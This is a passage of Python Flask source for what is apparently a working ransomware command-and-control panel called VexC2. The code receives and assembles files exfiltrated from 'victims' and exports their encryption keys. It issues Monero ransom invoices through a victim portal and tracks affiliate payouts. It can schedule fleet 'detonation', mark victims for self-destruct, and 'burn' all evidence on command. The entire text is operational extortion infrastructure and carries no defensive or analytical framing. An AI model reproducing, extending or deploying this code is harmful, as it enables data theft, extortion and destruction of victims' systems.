        return jsonify({"file_id": existing["id"],
                        "received": c2db.exfil_received(existing["id"]),
                        "deduplicated": True})
    safe = re.sub(r"[^A-Za-z0-9._-]", "_", os.path.basename(name))[:120] or "file"
    fid = c2db.exfil_create(vid, safe, size, sha, total)
    return jsonify({"file_id": fid, "received": c2db.exfil_received(fid)})


@app.route("/api/exfil/v2/chunk", methods=["POST"])
def api_exfil_chunk():
    vid = (request.form.get("vid") or request.args.get("vid") or "").strip()
    try:
        fid = int(request.form.get("file_id") or request.args.get("file_id") or 0)
        idx = int(request.form.get("idx") or request.args.get("idx") or 0)
    except ValueError:
        return "bad request", 400
    sha = (request.form.get("sha256") or request.args.get("sha256") or "").lower()
    if not _VID_RE.match(vid) or fid <= 0 or idx < 0:
        return "bad request", 400
    if not c2db.get_victim(vid):
        return "unknown victim", 404
    f = c2db.exfil_get(fid)
    if not f or f["vid"] != vid or idx >= int(f["total"]):
        return "bad file", 400
    try:
        raw = base64.b64decode(request.form.get("data") or request.args.get("data") or "")
    except Exception:
        return "bad data", 400
    if hashlib.sha256(raw).hexdigest() != sha:
        return "bad hash", 400
    text = vault.seal(base64.b64encode(raw).decode())
    path = os.path.join(UPLOAD_DIR, f".v2_{fid}_{idx}")
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(text)
    got = c2db.exfil_add_chunk(fid, idx, sha, path)
    if got >= int(f["total"]):
        try:
            data = c2db.exfil_assemble(fid)
            safe = re.sub(r"[^A-Za-z0-9._-]", "_",
                          os.path.basename(f["name"] or "file"))[:120] or "file"
            final = os.path.join(UPLOAD_DIR, f"{_safe_component(vid)}_{fid}_{safe}")
            with open(final, "wb") as out:
                out.write(data)
            c2db.add_upload(vid, safe, final, len(data))
            c2db.exfil_set_status(fid, "complete")
        except ValueError as exc:
            print(f"[exfil] assemble failed fid={fid}: {exc}", flush=True)
            c2db.exfil_set_status(fid, "bad")
        except OSError as exc:
            print(f"[exfil] io failed fid={fid}: {exc}", flush=True)
            c2db.exfil_set_status(fid, "bad")
    return jsonify({"file_id": fid, "received": got, "total": int(f["total"])})


@app.route("/api/exfil/v2/status/<int:fid>")
def api_exfil_status(fid):
    vid = (request.args.get("vid") or request.form.get("vid") or "").strip()
    f = c2db.exfil_get(fid)
    if not f:
        return jsonify({"error": "not found"}), 404
    if not vid or f["vid"] != vid:
        return jsonify({"error": "forbidden"}), 403
    return jsonify({"file_id": fid, "received": c2db.exfil_received(fid),
                    "total": int(f["total"]), "status": f["status"]})


@app.route("/admin/exfil/<int:fid>")
@login_required("admin")
def admin_exfil(fid):
    try:
        data = c2db.exfil_assemble(fid)
    except ValueError as exc:
        flash(f"exfil unavailable: {exc}", "error")
        return redirect(url_for("dashboard"))
    f = c2db.exfil_get(fid)
    return send_file(io.BytesIO(data), as_attachment=True,
                     download_name=f["name"] or "exfil.bin")


@app.route("/admin/refund/<vid>", methods=["POST"])
@login_required("admin")
def refund(vid):
    v = victim_or_404(vid)
    try:
        amount = float(request.form.get("amount") or 0)
    except ValueError:
        amount = 0.0
    if amount <= 0:
        flash("invalid refund amount", "error")
        return redirect(url_for("victim", vid=vid))
    if amount > c2db.payments_total(vid) + 1e-9:
        flash("refund exceeds recorded payments", "error")
        return redirect(url_for("victim", vid=vid))
    with c2db.db() as conn:
        row = conn.execute(
            "SELECT affiliate FROM payments WHERE vid=? AND affiliate!='' "
            "ORDER BY id DESC LIMIT 1", (vid,)).fetchone()
    affiliate = (row["affiliate"] or "") if row else ""
    c2db.add_payment(vid, -amount, (request.form.get("note") or "")[:200],
                     "", current_user() or "", affiliate)
    c2db.log_event(current_user(), "refund", vid, f"-{amount:.2f}")
    flash(f"refund recorded: ${amount:,.2f}", "ok")
    return redirect(url_for("victim", vid=vid))


@app.route("/admin/root")
@root_required
def root_console():
    with c2db.db() as conn:
        counts = {
            "victims": conn.execute("SELECT COUNT(*) FROM victims").fetchone()[0],
            "operators": conn.execute("SELECT COUNT(*) FROM operators").fetchone()[0],
            "messages": conn.execute("SELECT COUNT(*) FROM messages").fetchone()[0],
            "campaigns": conn.execute("SELECT COUNT(*) FROM campaigns").fetchone()[0],
            "leak_tokens": conn.execute("SELECT COUNT(*) FROM leak_tokens").fetchone()[0],
        }
    build = ""
    try:
        with open(os.path.join(APP_DIR, "..", "dist", "BUILD.txt"),
                  encoding="utf-8", errors="replace") as f:
            build = f.read()[:600]
    except OSError:
        build = "dist/BUILD.txt not present"
    audit_ok, bad = c2db.verify_audit_chain()
    cfg = {k: c2db.get_setting(k) for k in
           ("lockdown", "detonate_at", "deadman_hours", "deadman_action",
            "audit_frozen", "root_last_seen")}
    cfg["panic_pins_set"] = len(_panic_hashes()) == PANIC_PIN_COUNT
    return render_template("root.html", counts=counts, build=build,
                           audit_ok=audit_ok, bad_event=bad,
                           cfg=cfg,
                           backend=("postgres" if c2db.IS_PG else "sqlite"),
                           db_path=(("postgres:" + c2db.DB_URL.rsplit("@", 1)[-1])
                                    if c2db.IS_PG else c2db.DB_FILE),
                           flags={
                               "sig_bypass": False,
                               "payload_env": bool(os.environ.get("VEX_ALLOW_PAYLOAD")),
                               "tls_cookie": bool(os.environ.get("VEX_SECURE_COOKIE")),
                           },
                           permissions=PERMISSIONS)


@app.route("/admin/root/audit.json")
@root_required
def root_audit_json():
    with c2db.db() as conn:
        rows = conn.execute(
            "SELECT id, ts, actor, kind, vid, detail, prev_hash, hash "
            "FROM events ORDER BY id ASC LIMIT 20000").fetchall()
    ok, bad = c2db.verify_audit_chain()
    return jsonify({"chain_ok": ok, "bad_event": bad,
                    "events": [dict(r) for r in rows]})


@app.route("/admin/2fa", methods=["GET", "POST"])
@login_required()
def twofa():
    with c2db.db() as conn:
        op = conn.execute("SELECT * FROM operators WHERE username=?",
                          (session.get("user"),)).fetchone()
    if not op:
        abort(404)
    enrolled = bool(op["totp_secret"])
    secret = codes = None
    if request.method == "POST":
        action = (request.form.get("action") or "").strip()
        if action == "enroll" and not enrolled:
            if not c2db.verify_password(request.form.get("password") or "",
                                        op["pw_hash"]):
                flash("current password required to enroll 2FA", "error")
                return redirect(url_for("twofa"))
            secret = c2db.new_totp_secret()
            codes, hashed = c2db.make_backup_codes()
            with c2db.db() as conn:
                conn.execute("UPDATE operators SET totp_secret=?, backup_codes=? "
                             "WHERE id=?", (secret, hashed, op["id"]))
                conn.commit()
            c2db.log_event(current_user(), "2fa_enroll", "", "totp enabled")
            enrolled = True
            session.pop("must_enroll_2fa", None)
        elif action == "disable" and enrolled:
            if c2db.get_setting("require_2fa", "0") == "1":
                flash("2FA is required by policy; disable the policy first", "error")
                return redirect(url_for("twofa"))
            code = (request.form.get("code") or "").strip()
            ok = c2db.verify_totp(op["totp_secret"], code)
            if not ok:
                used, new_store = c2db.consume_backup_code(
                    op["backup_codes"] or "", code)
                if used:
                    with c2db.db() as conn:
                        conn.execute("UPDATE operators SET backup_codes=? WHERE id=?",
                                     (new_store, op["id"]))
                        conn.commit()
                ok = used
            if not ok:
                flash("invalid TOTP or backup code", "error")
                return redirect(url_for("twofa"))
            with c2db.db() as conn:
                conn.execute("UPDATE operators SET totp_secret='', backup_codes='' "
                             "WHERE id=?", (op["id"],))
                conn.commit()
            c2db.log_event(current_user(), "2fa_disable", "", "totp disabled")
            flash("2FA disabled", "ok")
            session.pop("must_enroll_2fa", None)
            return redirect(url_for("twofa"))
    otpauth = ""
    qr_svg = ""
    if secret:
        otpauth = ("otpauth://totp/VEX:" + str(op["username"]) + "?secret=" +
                   secret + "&issuer=VEX&digits=6&period=30")
        try:
            import qrcode
            import qrcode.image.svg
            img = qrcode.make(otpauth, image_factory=qrcode.image.svg.SvgPathImage)
            buf = io.BytesIO()
            img.save(buf)
            qr_svg = buf.getvalue().decode("utf-8", "replace")
        except Exception:
            qr_svg = ""
    return render_template("root_2fa.html", enrolled=enrolled, secret=secret,
                           codes=codes, otpauth=otpauth, qr_svg=qr_svg)


@app.route("/admin/root/stepup", methods=["GET", "POST"])
@root_required
def root_stepup():
    nxt = _safe_next(request.args.get("next") or request.form.get("next") or "",
                     url_for("root_console"))
    op = _stepup_operator()
    if not op:
        abort(404)
    if request.method == "POST":
        password = request.form.get("password") or ""
        stored = c2db.get_setting("stepup_pass_hash", "")
        ok = bool(stored) and c2db.verify_password(password, stored)
        if ok:
            session["root_stepup_at"] = time.time()
            session["root_stepup_ip"] = _client_ip()
            session["root_stepup_ua"] = _ua_hash()
            try:
                _stamp_root_seen()
            except Exception:
                pass
            c2db.log_event(current_user(), "root_stepup", "", "ok")
            pending = _take_root_pending(session.pop("root_pending_token", ""))
            if pending and pending.get("path") == nxt:
                # The blocked action was a POST: replay it as a POST form
                # instead of a GET redirect (which would be 405).
                return render_template("root_replay.html", action=nxt,
                                       fields=pending.get("form") or {})
            return redirect(nxt)
        c2db.log_event(current_user(), "root_stepup", "", "failed")
        flash("step-up failed", "error")
    return render_template("root_stepup.html", next=nxt)


@app.route("/admin/root/panic", methods=["POST"])
@root_stepup_required
def root_panic():
    if (request.form.get("confirm") or "").strip() != "DESTROY":
        flash("type DESTROY to confirm the fleet kill", "error")
        return redirect(url_for("root_console"))
    with c2db.db() as conn:
        n = conn.execute("UPDATE victims SET detonate=2, pardon=0, "
                         "status='dead'").rowcount
        conn.commit()
    c2db.log_event(current_user(), "root_panic", "", f"{n} victims")
    notify.send(f"ROOT PANIC: {n} victims marked self-destruct")
    flash(f"panic queued for {n} victims", "ok")
    return redirect(url_for("root_console"))


@app.route("/admin/root/keys.zip", methods=["POST"])
@root_stepup_required
def root_keys_zip():
    now_mono = time.time()
    last = float(session.get("keys_export_at", 0) or 0)
    if now_mono - last < 60:
        flash("keys export is limited to one per minute", "error")
        return redirect(url_for("root_console"))
    session["keys_export_at"] = now_mono
    export_id = secrets.token_hex(8)
    generated = c2db.now()
    actor = current_user() or "root"
    ip = _client_ip()

    with c2db.db() as conn:
        rows = conn.execute("SELECT vid, hostname, aes_key, wrapped_key "
                            "FROM victims WHERE aes_key!=''").fetchall()
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        manifest = {"export_id": export_id, "generated": generated,
                    "operator": actor, "ip": ip, "count": len(rows)}
        z.writestr("keys_export.json", json.dumps(manifest, indent=2))
        for r in rows:
            safe = re.sub(r"[^A-Za-z0-9._-]", "_", r["vid"])[:80] or "victim"
            body = ("export_id=" + export_id + "\n"
                    "generated=" + generated + "\n"
                    "operator=" + actor + "\n"
                    "ip=" + ip + "\n"
                    "vid=" + r["vid"] + "\n"
                    "host=" + (r["hostname"] or "") + "\n"
                    "aes_key_b64=" + vault.reveal(r["aes_key"] or "") + "\n"
                    "wrapped_b64=" + vault.reveal(r["wrapped_key"] or "") + "\n")
            z.writestr(safe + "/key.txt", body)
    c2db.log_event(actor, "root_key_export", "", f"{len(rows)} keys {export_id}")
    notify.send(f"ROOT key export: {len(rows)} keys ({export_id})")
    buf.seek(0)
    return send_file(buf, mimetype="application/zip", as_attachment=True,
                     download_name=f"vex_keys_{export_id}.zip")


@app.route("/admin/root/release/<vid>", methods=["POST"])
@root_stepup_required
def root_release(vid):
    victim_or_404(vid)
    c2db.release_victim(vid)
    c2db.log_event(current_user(), "root_override", vid, "release without payment")
    notify.send(f"ROOT release without payment: {vid[:12]}")
    flash("victim released; invoice voided", "ok")
    return redirect(url_for("victim", vid=vid))


@app.route("/admin/root/schedule", methods=["POST"])
@root_stepup_required
def root_schedule():
    when = _parse_when(request.form.get("when", ""))
    if not when or when <= datetime.datetime.now():
        flash("pick a future date/time", "error")
        return redirect(url_for("root_console"))
    c2db.set_setting("detonate_at", when.strftime("%Y-%m-%d %H:%M:%S"))
    c2db.log_event(current_user(), "root_schedule", "",
                   when.strftime("%Y-%m-%d %H:%M:%S"))
    notify.send(f"ROOT fleet detonation scheduled: {when}")
    flash("fleet detonation scheduled", "ok")
    return redirect(url_for("root_console"))


@app.route("/admin/root/schedule/cancel", methods=["POST"])
@root_stepup_required
def root_schedule_cancel():
    c2db.set_setting("detonate_at", "")
    c2db.log_event(current_user(), "root_schedule_cancel", "", "")
    flash("schedule cancelled", "ok")
    return redirect(url_for("root_console"))


@app.route("/admin/root/lockdown", methods=["POST"])
@root_stepup_required
def root_lockdown():
    on = request.form.get("on") == "1"
    c2db.set_setting("lockdown", "1" if on else "0")
    c2db.log_event(current_user(), "root_lockdown", "", "on" if on else "off")
    notify.send(f"ROOT lockdown {'enabled' if on else 'disabled'}")
    flash(f"lockdown {'enabled' if on else 'disabled'}", "ok")
    return redirect(url_for("root_console"))


@app.route("/admin/root/deadman", methods=["POST"])
@root_stepup_required
def root_deadman():
    try:
        hours = max(0, min(720, int(request.form.get("hours", "0"))))
    except ValueError:
        hours = 0
    action = request.form.get("action", "none")
    if action not in ("none", "pardon", "kill"):
        action = "none"
    c2db.set_setting("deadman_hours", str(hours))
    c2db.set_setting("deadman_action", action)
    c2db.set_setting("deadman_fired", "0")
    c2db.set_setting("root_last_seen", c2db.now())
    c2db.log_event(current_user(), "root_deadman", "", f"{hours}h {action}")
    flash("deadman policy saved and re-armed", "ok")
    return redirect(url_for("root_console"))


@app.route("/admin/root/view-as/<username>", methods=["POST"])
@root_required
def root_view_as(username):
    with c2db.db() as conn:
        op = conn.execute("SELECT username, role FROM operators WHERE username=?",
                          (username,)).fetchone()
    if not op or op["role"] in ("root", "shadow"):
        abort(404)
    session["impersonate"] = op["username"]
    session["impersonate_role"] = op["role"]
    session["view_as_root"] = True
    c2db.log_event(session.get("user"), "root_view_as", "", op["username"])
    return redirect(url_for("dashboard"))


@app.route("/admin/view-as/stop", methods=["POST"])
def view_as_stop():
    return root_view_as_stop()


@app.route("/admin/root/view-as/stop", methods=["POST"])
def root_view_as_stop():
    if not session.get("view_as_root"):
        abort(403)
    who = session.get("impersonate")
    session.pop("impersonate", None)
    session.pop("impersonate_role", None)
    session.pop("view_as_root", None)
    c2db.log_event(session.get("user"), "root_view_as_stop", "", who or "")
    return redirect(url_for("dashboard"))


@app.route("/admin/operators/<int:oid>/timeline")
@root_required
def operator_timeline(oid):
    with c2db.db() as conn:
        op = conn.execute("SELECT id, username, role, created, last_login "
                          "FROM operators WHERE id=?", (oid,)).fetchone()
        if not op:
            abort(404)
        events = conn.execute("SELECT id, ts, kind, vid, detail FROM events "
                              "WHERE actor=? ORDER BY id DESC LIMIT 200",
                              (op["username"],)).fetchall()
        counts = conn.execute("SELECT kind, COUNT(*) c FROM events WHERE actor=? "
                              "GROUP BY kind ORDER BY c DESC",
                              (op["username"],)).fetchall()
    return render_template("operator_timeline.html", op=op, events=events,
                           counts=counts)


@app.route("/admin/root/audit-freeze", methods=["POST"])
@root_stepup_required
def root_audit_freeze():
    on = request.form.get("on") == "1"
    c2db.set_setting("audit_frozen", "1" if on else "0")
    c2db.log_event(current_user(), "root_audit_freeze", "", "on" if on else "off")
    flash(f"audit view {'frozen' if on else 'unfrozen'}", "ok")
    return redirect(url_for("root_console"))


def _audit_key() -> bytes:
    raw = os.environ.get("VEX_AUDIT_KEY", "")
    if raw:
        return raw.encode()
    sk = app.secret_key
    return sk if isinstance(sk, bytes) else str(sk).encode()


@app.route("/admin/root/audit-snapshot")
@root_stepup_required
def root_audit_snapshot():
    with c2db.db() as conn:
        rows = conn.execute(
            "SELECT id, ts, actor, kind, vid, detail, prev_hash, hash "
            "FROM events ORDER BY id ASC LIMIT 20000").fetchall()
    ok, bad = c2db.verify_audit_chain()
    snapshot = {"generated": c2db.now(), "chain_ok": ok, "bad_event": bad,
                "events": [dict(r) for r in rows]}
    blob = json.dumps(snapshot, sort_keys=True, separators=(",", ":"))
    sig = hmac.new(_audit_key(), blob.encode(), hashlib.sha256).hexdigest()
    c2db.log_event(current_user(), "root_audit_snapshot", "", f"sig={sig[:16]}")
    return Response(json.dumps({"alg": "hmac-sha256", "sig": sig,
                                "snapshot": snapshot}),
                    mimetype="application/json", headers={
                        "Content-Disposition": "attachment; filename=audit_snapshot.json"})


@app.route("/admin/root/audit-verify", methods=["POST"])
@root_stepup_required
def root_audit_verify():
    data = request.get_json(silent=True) or {}
    snap = data.get("snapshot")
    sig = data.get("sig", "")
    if not isinstance(snap, dict) or not sig:
        return jsonify({"valid": False, "error": "missing snapshot/signature"}), 400
    blob = json.dumps(snap, sort_keys=True, separators=(",", ":"))
    expect = hmac.new(_audit_key(), blob.encode(), hashlib.sha256).hexdigest()
    return jsonify({"valid": hmac.compare_digest(expect, sig),
                    "chain_ok": bool(snap.get("chain_ok"))})


@app.route("/admin/root/rotate-master", methods=["POST"])
@root_stepup_required
def root_rotate_master():
    new = (request.form.get("new_master") or "").strip()
    confirm = (request.form.get("confirm") or "").strip()
    if len(new) < 12 or new != confirm:
        flash("master must be 12+ chars and match the confirmation", "error")
        return redirect(url_for("root_console"))
    try:
        res = vault_rotate.rotate(new)
    except Exception as exc:
        flash(f"rotation failed: {exc}", "error")
        return redirect(url_for("root_console"))
    c2db.log_event(current_user(), "root_master_rotate", "",
                   f"victims={res['victims']} files={res['files']}")
    notify.send("ROOT master key rotated")
    flash(f"master rotated: {res['victims']} victims, {res['files']} chunks; "
          f"backup {res['backup'] or 'n/a'}", "ok")
    if os.environ.get("VEX_MASTER"):
        flash("VEX_MASTER is still set; VexC2/.master now takes precedence. "
              "Remove the old env value and restart.", "error")
    return redirect(url_for("root_console"))


@app.route("/admin/root/definitive")
@root_required
def root_definitive():
    cfg = {"panic_pins_set": len(_panic_hashes()) == PANIC_PIN_COUNT,
           "panic_locked": _panic_locked()}
    return render_template("root_definitive.html", cfg=cfg)


@app.route("/admin/root/panic-pins", methods=["POST"])
@root_stepup_required
def root_panic_pins():
    if _panic_hashes():
        flash("panic pins are already configured; replace them only offline", "error")
        return redirect(url_for("root_definitive"))
    pins = [(request.form.get("pin%d" % i) or "").strip() for i in range(1, 6)]
    if any(not re.fullmatch(r"\d{4,8}", p) for p in pins):
        flash("each panic pin must be 4-8 digits", "error")
        return redirect(url_for("root_definitive"))
    if len(set(pins)) != PANIC_PIN_COUNT:
        flash("the five panic pins must be different", "error")
        return redirect(url_for("root_definitive"))
    c2db.set_setting("panic_pins",
                     json.dumps([c2db.hash_password(p) for p in pins]))
    c2db.set_setting("panic_fail_count", "0")
    c2db.set_setting("panic_lock_until", "")
    c2db.log_event(current_user(), "panic_pins_set", "", "5 pins")
    notify.send("ROOT panic pins configured")
    flash("panic pins configured (hashes only)", "ok")
    return redirect(url_for("root_definitive"))


@app.route("/admin/root/burn", methods=["POST"])
@root_stepup_required
def root_burn():
    pins = [(request.form.get("pin%d" % i) or "").strip() for i in range(1, 6)]
    ok, msg = _panic_verify(pins)
    if not ok:
        flash(msg, "error")
        return redirect(url_for("root_definitive"))
    dry = os.environ.get("VEX_PANIC_DRY") == "1"
    res = _burn_execute(dry)
    if dry:
        c2db.log_event(current_user(), "panic_dry", "",
                       "%d targets" % len(res["paths"]))
        body = ("<html><body style=\"background:#050608;color:#ffcc66;"
                "font-family:monospace;padding:48px\"><h1>BURN DRY RUN</h1>"
                "<p>no data was destroyed.</p><pre>"
                + html_mod.escape(json.dumps(res["paths"], indent=2))
                + "</pre></body></html>")
        return Response(body, mimetype="text/html")
    delay = int(os.environ.get("VEX_PANIC_EXIT_SECONDS", "600"))
    try:
        threading.Timer(delay, lambda: os._exit(0)).start()
    except Exception:
        pass
    body = ("<html><body style=\"background:#050608;color:#ff4d6d;"
            "font-family:monospace;padding:48px\"><h1>OPERATION BURNED</h1>"
            "<p>victims queued for self-destruct: "
            + str(res.get("killed", 0)) + "</p>"
            "<p>local artifacts destroyed: "
            + str(len(res.get("removed", []))) + "</p>"
            "<p>targets that resisted deletion: "
            + str(len(res.get("failed", []))) + "</p>"
            "<p>keys, database, uploads, builds and secrets are gone. "
            "the panel exits in " + str(delay) + "s; pings answer kill until then.</p>"
            "</body></html>")
    return Response(body, mimetype="text/html")


@app.route("/admin/exfil")
@login_required("admin")
def exfil_page():
    if _audit_blocked():
        abort(403)
    return render_template("exfil.html", rows=c2db.list_exfil_files(200))


@app.route("/admin/exfil/<int:fid>/view")
@login_required("admin")
def exfil_detail(fid):
    if _audit_blocked():
        abort(403)
    f = c2db.exfil_get(fid)
    if not f:
        abort(404)
    return render_template("exfil_detail.html", f=f,
                           chunks=c2db.exfil_chunks(fid))


@app.route("/admin/exfil/<int:fid>/stream")
@login_required("admin")
def exfil_stream(fid):
    if _audit_blocked():
        abort(403)
    f = c2db.exfil_get(fid)
    if not f:
        abort(404)
    chunks = c2db.exfil_chunks(fid)
    if len(chunks) != int(f["total"]):
        abort(409)
    for c in chunks:
        if not os.path.isfile(c["path"]):
            abort(409)

    def generate():
        for c in chunks:
            text = open(c["path"], "r", encoding="utf-8").read()
            raw = base64.b64decode(vault.reveal(text))
            yield raw

    c2db.log_event(current_user(), "exfil_stream", f["vid"], f["name"])
    return Response(generate(), mimetype="application/octet-stream",
                    headers={"Content-Disposition":
                             f'attachment; filename="{os.path.basename(f["name"])}"'})


@app.route("/admin/exfil/<int:fid>/delete", methods=["POST"])
@login_required("admin")
def exfil_delete(fid):
    f = c2db.exfil_get(fid)
    if not f:
        abort(404)
    for path in c2db.delete_exfil(fid):
        try:
            rp = os.path.realpath(path)
            if os.path.commonpath([os.path.realpath(UPLOAD_DIR), rp]) != \
                    os.path.realpath(UPLOAD_DIR):
                continue
            os.unlink(rp)
        except (OSError, ValueError):
            pass
    c2db.log_event(current_user(), "exfil_delete", f["vid"], f["name"])
    flash("exfil file deleted", "ok")
    return redirect(url_for("exfil_page"))


@app.route("/admin/exfil/prune", methods=["POST"])
@login_required("admin")
def exfil_prune():
    removed = 0
    known = {int(r["id"]) for r in c2db.list_exfil_files(10000)}
    for name in glob.glob(os.path.join(UPLOAD_DIR, ".v2_*")):
        try:
            fid = int(os.path.basename(name).split("_")[1])
        except (IndexError, ValueError):
            continue
        if fid not in known:
            try:
                os.unlink(name)
                removed += 1
            except OSError:
                pass
    flash(f"pruned {removed} orphan chunk(s)", "ok")
    return redirect(url_for("exfil_page"))


def _invoice_qr(v):
    try:
        import qrcode
        import qrcode.image.svg
    except ImportError:
        return None
    addr = (v["xmr_address"] or c2db.get_setting("xmr_address", "")).strip()
    amount = c2db.effective_price(v)
    inv = c2db.ensure_invoice(v)
    uri = (f"monero:{addr}?tx_amount={amount:.2f}"
           f"&tx_description={urllib.parse.quote(inv)}")
    img = qrcode.make(uri, image_factory=qrcode.image.svg.SvgPathImage)
    buf = io.BytesIO()
    img.save(buf)
    return buf.getvalue()


@app.route("/admin/victim/<vid>/invoice-qr.svg")
@login_required()
def admin_invoice_qr(vid):
    svg = _invoice_qr(victim_or_404(vid))
    if svg is None:
        return "qrcode module not installed", 503
    return Response(svg, mimetype="image/svg+xml")


@app.route("/portal/invoice-qr.svg")
def portal_invoice_qr():
    vid = session.get("vid")
    v = c2db.get_victim(vid) if vid else None
    if not v:
        abort(403)
    svg = _invoice_qr(v)
    if svg is None:
        return "qrcode module not installed", 503
    return Response(svg, mimetype="image/svg+xml")


@app.route("/admin/invoices")
@login_required("admin")
def invoices_page():
    with c2db.db() as conn:
        rows = conn.execute(
            "SELECT i.*, v.hostname FROM invoices i LEFT JOIN victims v "
            "ON v.vid=i.vid ORDER BY i.id DESC LIMIT 500").fetchall()
    return render_template("invoices.html", rows=rows)

def _startup() -> None:
    try:
        days = int(c2db.get_setting("event_retention_days", "90") or 90)
        res = c2db.prune(days)
        if res["events"] or res["reports"]:
            print(f"[*] retention: pruned {res['events']} events, {res['reports']} reports")
    except Exception as exc:
        print(f"[!] retention failed: {exc}")

    backup_dir = os.environ.get("VEX_BACKUP_DIR")
    if backup_dir:
        try:
            keep = int(c2db.get_setting("backup_keep", "7") or 7)
            path = c2db.backup_snapshot(backup_dir, keep)
            print(f"[*] backup snapshot: {path}")
        except Exception as exc:
            print(f"[!] backup failed: {exc}")

    if os.environ.get("VEX_PAYMENTS") == "1":
        def loop():
            while True:
                try:
                    n = payments.poll_once()
                    if n:
                        print(f"[*] payments: {n} confirmed")
                except Exception as exc:
                    print(f"[!] payments: {exc}")
                time.sleep(60)
        threading.Thread(target=loop, daemon=True).start()
        print("[*] payment poller started")

    def deadline_loop():
        while True:
            try:
                c2db.expire_commands()
                n = c2db.deadline_tick()
                if n:
                    print(f"[*] deadlines: {n} action(s) queued")
                    notify.send(f"deadline reached: {n} victim(s) actioned")
            except Exception as exc:
                print(f"[!] deadlines: {exc}")
            time.sleep(60)

    threading.Thread(target=deadline_loop, daemon=True).start()


_startup()

if __name__ == "__main__":
    print(f"[*] VexC2 3.0 on http://0.0.0.0:{os.environ.get('PORT', '5000')}")
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", "5000")),
            threaded=True)
